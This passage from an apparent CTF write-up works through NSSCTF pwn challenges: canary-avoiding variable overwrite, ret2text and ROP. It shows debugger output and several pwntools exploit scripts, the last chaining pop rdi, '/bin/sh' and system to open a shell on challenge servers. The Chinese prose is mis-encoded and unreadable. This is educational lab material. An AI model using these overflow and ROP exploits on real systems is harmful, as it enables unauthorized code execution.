<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">break main
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/6.png"
	width="1395"
	height="299"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/6_hu_50701a557153789b.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/6_hu_492289174603babd.png 1024w"
	loading="lazy"
	
		alt="pwndbg"
	
	
		class="gallery-image" 
		data-flex-grow="466"
		data-flex-basis="1119px"
	
></p>
<p>è¾“å…¥rè¿è¡Œï¼ˆrunï¼‰</p>
<p>è¿™æ—¶å€™å°±ä¼šè¾“å‡ºè°ƒè¯•ç•Œé¢äº†ï¼Œä½ å¯ä»¥ç”¨nä¸€æ­¥æ­¥è·³ï¼Œçœ‹å¯„å­˜å™¨ã€åœ°å€ç­‰å˜åŒ–ï¼Œæˆ‘ä»¬è¦æ‰¾ä¸€ä¸‹canaryçš„ä½ç½®ï¼Œçœ‹æ˜¯å¦åœ¨v5ä¹‹ä¸‹ï¼Œè¿™æ ·å­æˆ‘ä»¬å°±å¯ä»¥è¦†ç›–v5ï¼Œä½†è¦†ç›–é•¿åº¦ä¸è¶…è¿‡v5ï¼Œä¸ä¼šè®©canaryè¢«è§¦å‘ã€‚</p>
<p>æŸ¥çœ‹æ ˆï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">stack 40
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/7.png"
	width="1420"
	height="445"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/7_hu_58017d81254994e8.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/7_hu_badb6a497419eb82.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="319"
		data-flex-basis="765px"
	
></p>
<p>ç¬¬ä¸€è¡Œçš„æ˜¯v4ä½ç½®ï¼Œç¬¬äºŒè¡Œæ˜¯canaryä½ç½®ï¼ˆcanaryä½ç½®ä¸€èˆ¬éƒ½åœ¨æœ«å°¾æœ‰00æ•´æ•°çš„åœ°å€ï¼Œé™¤éå‡ºé¢˜äººç‰¹åˆ«è¿˜å»è°ƒäº†canaryçš„ä½ç½®å°±å¦è¯´ğŸ˜„ï¼‰ï¼Œæ¬¸ï¼Ÿv5å»å“ªäº†ï¼Œv5åº”è¯¥æ˜¯0x522ï¼ˆåè¿›åˆ¶è½¬ä¸º520ï¼‰ï¼Œè¿™é‡Œæ²¡çœ‹åˆ°0x522çš„èº«å½±ã€‚</p>
<p>çœ‹å›IDAï¼š</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/8.png"
	width="725"
	height="344"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/8_hu_93087ebc19dd5194.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/8_hu_8858c6a4a4b81d69.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="210"
		data-flex-basis="505px"
	
></p>
<p>å½“å‰<code>stack</code>è¾“å‡ºä¸­ï¼Œ<code>rbp</code>çš„åœ°å€æ˜¯<code>0x7fffffffdaf0</code>ï¼›</p>
<p>æ‰€ä»¥è¯´åº”å½“æ˜¯<code>v5çš„åœ°å€ = 0x7fffffffdaf0 - 0xC = 0x7fffffffdae4</code></p>
<p>è¿™é‡Œè°ƒè¯•ç•Œé¢ä¼¼ä¹æ²¡çœ‹åˆ°v5å‘¢&hellip;</p>
<blockquote class="alert alert-note">
    <blockquote>
<p>æŸ¥çœ‹å½“å‰<code>stack</code>è¾“å‡ºï¼Œ<code>0x7fffffffdae4</code>è¿™ä¸ªåœ°å€<strong>æ²¡æœ‰ç›´æ¥æ˜¾ç¤ºåœ¨<code>stack 40</code>çš„æ¡ç›®é‡Œ</strong>ï¼Œä½†å®ƒä½äºä¸¤ä¸ªæ˜¾ç¤ºæ¡ç›®ä¹‹é—´ï¼š</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th><code>stack</code>æ¡ç›®åºå·</th>
          <th>åœ°å€</th>
          <th>è¯´æ˜</th>
          <th>ä¸<code>v5</code>åœ°å€çš„å…³ç³»</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>00:0000</td>
          <td>0x7fffffffdae0</td>
          <td><code>v4</code>çš„åœ°å€ï¼ˆ<code>char[4]</code>æ•°ç»„ï¼‰</td>
          <td><code>v5</code>åœ°å€ï¼ˆ<code>dae4</code>ï¼‰åœ¨å…¶<strong>é«˜åœ°å€ä¾§</strong>ï¼ˆç›¸å·® 4 å­—èŠ‚ï¼Œå› <code>v4</code>å  4 å­—èŠ‚ï¼‰</td>
      </tr>
      <tr>
          <td>01:0008</td>
          <td>0x7fffffffdae8</td>
          <td>Canaryï¼ˆ<code>v6</code>ï¼‰çš„åœ°å€</td>
          <td><code>v5</code>åœ°å€ï¼ˆ<code>dae4</code>ï¼‰åœ¨å…¶<strong>ä½åœ°å€ä¾§</strong>ï¼ˆç›¸å·® 4 å­—èŠ‚ï¼Œå› <code>v5</code>å  4 å­—èŠ‚ï¼‰</td>
      </tr>
  </tbody>
</table></div>
<p>ç®€å•è¯´ï¼š<code>v5</code>å¤¹åœ¨<code>v4</code>ï¼ˆ<code>dae0</code>ï¼‰å’Œ<code>Canary</code>ï¼ˆ<code>dae8</code>ï¼‰ä¹‹é—´ï¼Œåœ°å€æ˜¯<code>0x7fffffffdae4</code>ï¼Œå¯¹åº”æ ˆä¸­ â€œ<code>dae0</code>ä¹‹åã€<code>dae8</code>ä¹‹å‰â€ çš„ 4 å­—èŠ‚å†…å­˜ã€‚</p>
<p>è™½ç„¶<code>stack</code>å‘½ä»¤æ²¡ç›´æ¥æ˜¾ç¤º<code>dae4</code>ï¼Œä½†å¯åœ¨<code>pwndbg</code>ä¸­ç”¨<code>x</code>å‘½ä»¤ç›´æ¥æŸ¥çœ‹è¯¥åœ°å€çš„<code>v5</code>å€¼ï¼ˆæŒ‡å®š<code>int</code>ç±»å‹æ ¼å¼ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># æ ¼å¼è¯´æ˜ï¼š/w=4å­—èŠ‚ï¼ˆintç±»å‹ï¼‰ï¼Œx=åå…­è¿›åˆ¶ï¼ŒæŸ¥çœ‹0x7fffffffdae4åœ°å€
</span></span><span class="line"><span class="cl">x/wx 0x7fffffffdae4
</span></span></code></pre></td></tr></table>
</div>
</div></blockquote></blockquote>
<blockquote class="alert alert-tip">
    <blockquote>
<p>ä¹‹æ‰€ä»¥åœ¨<code>stack 40</code>ä¸­çœ‹ä¸åˆ°<code>v5</code>çš„åœ°å€ï¼Œæ˜¯å› ä¸º<code>stack</code>å‘½ä»¤é»˜è®¤æŒ‰ â€œ8 å­—èŠ‚æ­¥é•¿â€ æ˜¾ç¤ºæ ˆæ¡ç›®ï¼ˆ64 ä½ç³»ç»Ÿï¼‰ï¼Œè€Œ<code>v5</code>çš„åœ°å€<code>dae4</code>æ˜¯ â€œé 8 å­—èŠ‚å¯¹é½â€ çš„ä¸­é—´åœ°å€ï¼Œéœ€æ‰‹åŠ¨æŸ¥çœ‹ã€‚</p>
</blockquote></blockquote>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/9.png"
	width="885"
	height="140"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/9_hu_d1b370dc1283d81c.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/9_hu_43b1ffccfa4e0f64.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="632"
		data-flex-basis="1517px"
	
></p>
<p>è¿™æ—¶å€™æˆ‘ä»¬å°±çŸ¥é“v5åœ¨canaryä¹‹ä¸Šäº†ï¼Œè¦†ç›–v5çš„è¯ï¼Œcanaryä¸ä¼šçŸ¥é“ã€‚</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node6.anna.nssctf.cn&#39;</span><span class="p">,</span> <span class="mi">23886</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x208</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">num</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Hello! Input a number:&#34;</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯èƒ½æˆ‘çš„WPæ¯”è¾ƒå¤æ‚ï¼Œçœ‹èµ·æ¥éå¸¸éå¸¸éš¾ï¼Œä½†åªä¸è¿‡æˆ‘æŠŠæ¯ä¸€æ­¥éƒ½ç»†åŒ–äº†ï¼Œæ¯ä¸€æ­¥éƒ½æ˜¯æˆ‘çš„æ€è€ƒç›´é¢å‘ˆç°ç»™ä½ ï¼Œè®©ä½ PWN-0åŸºç¡€éƒ½èƒ½æ¥è¿‘çœ‹æ‡‚çš„ã€‚</p>
<h2 id="æ•´æ•°æº¢å‡º">æ•´æ•°æº¢å‡º
</h2><p><a class="link" href="PWN-3" >PWN-3</a></p>
<p>checksec</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/10.png"
	width="660"
	height="179"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/10_hu_d71ee701b385a61e.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/10_hu_9fe6b77a5a4843f8.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="368"
		data-flex-basis="884px"
	
></p>
<p>IDA64åˆ†æï¼š</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/11.png"
	width="650"
	height="205"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/11_hu_1285563de9531caa.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/11_hu_e3486e12b18fe565.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="317"
		data-flex-basis="760px"
	
></p>
<p>åœ¨å‡½æ•°ç›®å½•çœ‹åˆ°äº†vulnå‡½æ•°ï¼š</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/12.png"
	width="1080"
	height="683"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/12_hu_4771ebbe9d479370.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/12_hu_bc3318888b7b107e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="158"
		data-flex-basis="379px"
	
></p>
<p>åœ°å€ä¹Ÿç»™äº†ï¼š0x4011dd</p>
<p>é‚£æˆ‘ä»¬åœ¨åœ¨æ ˆæº¢å‡ºä¹‹åï¼Œç”¨è¿™ä¸ªvulnåœ°å€è¦†ç›–è¿”å›åœ°å€ï¼Œè®©ç¨‹åºè¿”å›åˆ°è¿™ä¸ªåœ°å€æ‰§è¡Œ<code>/bin/sh</code>ã€‚</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node7.anna.nssctf.cn&#39;</span><span class="p">,</span> <span class="mi">21218</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">vuln</span> <span class="o">=</span> <span class="mh">0x4011dd</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x20</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vuln</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ret2textåŠå…¶å˜ç§">ret2textåŠå…¶å˜ç§
</h2><p><a class="link" href="PWN-4" >PWN-4</a></p>
<p>checksecï¼š</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/13.png"
	width="630"
	height="194"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/13_hu_f19faaf3f4ca4e01.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/13_hu_3a8a8c6a5e78939.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="324"
		data-flex-basis="779px"
	
></p>
<p>IDA64åˆ†æï¼š</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/14.png"
	width="700"
	height="211"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/14_hu_6849e26c3d693007.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/14_hu_94860c7cbf5d99d2.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="331"
		data-flex-basis="796px"
	
></p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/15.png"
	width="565"
	height="209"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/15_hu_d4535932255a187d.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/15_hu_c4f622ce6c52a5b5.png 1024w"
	loading="lazy"
	
		alt="vulnå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="270"
		data-flex-basis="648px"
	
></p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node6.anna.nssctf.cn&#39;</span><span class="p">,</span> <span class="mi">28672</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">vuln</span> <span class="o">=</span> <span class="mh">0x4011ff</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x20</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vuln</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="rop">ROP
</h2><p><a class="link" href="PWN-5" >PWN-5</a></p>
<p>checksecï¼š</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/16.png"
	width="609"
	height="234"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/16_hu_d793394d041a98bc.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/16_hu_bf030dfe2f0f89b0.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="260"
		data-flex-basis="624px"
	
></p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/18.png"
	width="1215"
	height="695"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/18_hu_426e1a73daded7b1.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/18_hu_79cfc03db213edb9.png 1024w"
	loading="lazy"
	
		alt="vulnå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="174"
		data-flex-basis="419px"
	
></p>
<p>vuln = 0x4011dd</p>
<p>é¢˜ç›®éƒ½ç»™æç¤ºäº†ï¼Œé‚£å°±æ˜¯æ„é€ ROPæ”»å‡»é“¾äº†ï¼Œæ¯”è¾ƒç®€å•ï¼Œå¤šåŠ ä¸ªretçš„gadgetå°±å¯ä»¥äº†ï¼Œç”¨ROPgadgetå‘½ä»¤æŸ¥è¯¢åˆ°retçš„gadgetåœ°å€ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary main <span class="p">|</span> grep <span class="s2">&#34;ret&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/17.png"
	width="930"
	height="250"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/17_hu_ffd219aa802a5c80.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/17_hu_e7c2344844fd45d8.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="372"
		data-flex-basis="892px"
	
></p>
<p>ret_address = 0x000000000040101a</p>
<p>expå†…å®¹å°±å’Œä¸Šé¢˜å·®ä¸å¤šï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node6.anna.nssctf.cn&#39;</span><span class="p">,</span> <span class="mi">25982</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">vuln</span> <span class="o">=</span> <span class="mh">0x4011dd</span>
</span></span><span class="line"><span class="cl"><span class="n">ret_address</span> <span class="o">=</span> <span class="mh">0x000000000040101a</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x20</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vuln</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ropgadget">ROPgadget
</h2><p><a class="link" href="PWN-6" >PWN-6</a></p>
<p>checksecï¼š</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/19.png"
	width="665"
	height="204"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/19_hu_c668a7a75614c910.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/19_hu_4b5401f9a8d907e3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="325"
		data-flex-basis="782px"
	
></p>
<p>è¿™æ¬¡ä½ å¯ä»¥å‘ç°ï¼š</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/20.png"
	width="945"
	height="384"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/20_hu_e3a72c5479855e36.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/20_hu_4072a7ec058350d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="246"
		data-flex-basis="590px"
	
></p>
<p>systemå‚æ•°ä¸å†æ˜¯/bin/shäº†ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦æ„é€ å‡º<code>system(&quot;/bin/sh&quot;);</code></p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/22.png"
	width="1184"
	height="660"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/22_hu_6f21cb1a88e7e281.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/22_hu_b15cd603448e3f8d.png 1024w"
	loading="lazy"
	
		alt="systemå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="179"
		data-flex-basis="430px"
	
></p>
<p>systemå‡½æ•°åœ°å€æ˜¯0x4011A5</p>
<p>systemåªéœ€è¦ä¼ é€’ä¸€ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆåªéœ€è¦rdiå¯„å­˜å™¨ï¼Œé‚£è¿˜æ˜¯ç”¨åˆ°ROPgadgetï¼š</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/21.png"
	width="1045"
	height="359"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/21_hu_b439eadc3614611e.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/21_hu_1aaf75bc19e82999.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="291"
		data-flex-basis="698px"
	
></p>
<p>pop_rdi_ret = 0x000000000040125b</p>
<p>Alt+Tæœç´¢<code>/bin/sh</code>å­—ç¬¦ä¸²ï¼š</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/23.png"
	width="851"
	height="165"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/23_hu_7efb778a6c9675d7.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/23_hu_8bf6950f6bc48618.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="515"
		data-flex-basis="1237px"
	
></p>
<p>/bin/shçš„åœ°å€ï¼š0x404048</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node7.anna.nssctf.cn&#39;</span><span class="p">,</span> <span class="mi">22526</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="mh">0x404048</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x000000000040125b</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="mh">0x4011A5</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x40</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
